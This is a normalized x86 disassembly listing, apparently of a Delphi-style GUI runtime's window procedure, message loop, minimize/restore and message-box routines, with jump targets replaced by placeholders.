mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_41b654
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_44d7a4
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_467e34
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4669d4
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_466978
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_44d7a4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4663f4
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_4651a8
push ebp
call sub_465c68
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_465c68
pop ecx
jmp [ eax * 4 + jump_table_465d94 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_44d7a4
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_466838
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4520fc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_465bfc
push ebp
call sub_465c68
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_465c68
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_465c68
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_423908
jmp r-xdata
xor eax eax
call sub_45db28
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_44d7a4
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_448138
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_466410
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_465c68
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_4633a8
jmp r-xdata
push ebp
call sub_465c68
pop ecx
jmp r-xdata
push ebp
call sub_465ca4
pop ecx
jmp r-xdata
push ebp
call sub_465c68
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_465b08
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4664c0
jmp r-xdata
jmp r-xdata
call sub_43a564
call sub_43a644
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_465af8
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_465b08
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_465b00
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45d9d8
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_465c68
pop ecx
jmp r-xdata
call sub_45da8c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_465c68
pop ecx
jmp r-xdata
call sub_43a564
call sub_43a6a0
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d86c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_466410
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_465af8
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_465428
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_44d7a4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_44d7a4
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_4664c0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_465428
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_44d7a4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_465b08
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_44d7a4
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_461134
mov eax [ ebx + 0x44 ]
call sub_463550
sub_4665c0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_4665fc
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_404174
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404210
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_466648
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4666ca
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
lea eax [ ebx + 0x8c ]
mov edx esi
call sub_404174
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4665fc
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40452c
jne r-xdata
mov eax esi
call sub_4045e0
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowTextA
lea eax [ ebx + 0x8c ]
call sub_404120
jmp r-xdata
cmp [ ebx + 0x8c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4666d1
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_4666d8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_4666fc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_46674c
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_443e64
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_44d7a4
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_466804
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_46777c
sub_466838
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_44d7a4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_40358c
test al al
jne r-xdata
sub_4668a4
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_466804
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4666fc
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46674c
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_4666d8
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_466954
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4668a4
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_467224
sub_466978
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_41b634
mov eax 0x8
call sub_4027b4
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_41b4f8
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_4669d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_41b654
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4027d4
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_41b544
jmp r-xdata
sub_466a68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_466aa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_44d780
mov [ esi + 0x44 ] edi
sub_466ae8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_466bc6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_45d950
call sub_4080d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466bcd
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_461134
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_403870#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_466954
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_46003c
mov eax [ ebp - 0x4 ]
call sub_466410
jmp r-xdata
sub_466be8
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_402844
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_402864
push eax
call sub_402844
pop edx
call sub_40bb70
call sub_402844
mov edx [ rw-data ]
call sub_40351c
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_402844
mov edx eax
mov eax ebx
call sub_466de0
pop esi
pop ebx
retn
call sub_402844
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_466c78
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_45d9d8
mov [ ebp - 0x10 ] eax
call sub_45d8f4
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_465b74
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_466dcd
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466dd4
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_45da8c
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_45d8fc
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_466de0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466e9b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4041b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_4665fc
mov eax [ ebp - 0x108 ]
call sub_4045e0
push eax
mov eax [ ebp - 0x4 ]
call sub_4045e0
mov edx eax
mov eax ebx
pop ecx
call sub_466c78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466ea2
lea eax [ ebp - 0x108 ]
call sub_404120
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax [ ebp - 0x4 ]
call sub_408a60
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402e98
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402cb0
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4043e8
sub_466eb8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_44d940
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_44daa8
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_46755c
test al al
je r-xdata
call sub_44d7a4
mov ebp eax
mov eax edi
call sub_44d7a4
mov ebp eax
mov eax esi
call sub_46755c
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_467020
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_467078
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46755c
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_467da8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46707f
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_467088
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4670e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46755c
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_467da8
